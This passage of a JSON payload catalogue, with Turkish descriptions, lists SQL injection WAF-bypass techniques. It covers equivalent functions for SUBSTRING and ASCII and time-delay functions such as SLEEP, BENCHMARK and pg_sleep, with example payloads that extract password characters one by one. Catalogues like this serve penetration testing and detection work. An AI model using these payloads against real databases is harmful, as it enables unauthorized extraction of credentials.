    "purpose": "WAF keyword detection bypass",
    "reference": "HackTricks"
  },
  "waf_bypass_equivalent_functions": {
    "desc": "Equivalent fonksiyonlarla bypass",
    "category": "SQL Injection",
    "type": "WAF Bypass",
    "risk": "High",
    "equivalents": {
      "substring": {
        "desc": "SUBSTRING alternatif kullanımları",
        "alternatives": [
          "SUBSTR()",
          "MID()",
          "LEFT()",
          "RIGHT()"
        ],
        "examples": [
          "SUBSTRING(password,1,1) = 'a'",
          "SUBSTR(password,1,1) = 'a'",
          "MID(password,1,1) = 'a'",
          "LEFT(password,1) = 'a'"
        ]
      },
      "ascii": {
        "desc": "ASCII alternatif kullanımları",
        "alternatives": [
          "ORD()",
          "HEX()",
          "BIN()"
        ],
        "examples": [
          "ASCII(SUBSTRING(password,1,1)) = 97",
          "ORD(SUBSTRING(password,1,1)) = 97",
          "HEX(SUBSTRING(password,1,1)) = '61'"
        ]
      },
      "sleep": {
        "desc": "SLEEP alternatif kullanımları",
        "alternatives": [
          "BENCHMARK()",
          "WAIT FOR DELAY",
          "pg_sleep()",
          "dbms_lock.sleep()"
        ],
        "examples": [
          "SLEEP(5)",
          "BENCHMARK(10000000,MD5('A'))",
          "WAIT FOR DELAY '00:00:05'",
          "pg_sleep(5)",
          "dbms_lock.sleep(5)"
        ]
      }
    },
    "purpose": "Fonksiyon filtering bypass",
    "reference": "PayloadsAllTheThings"
  },
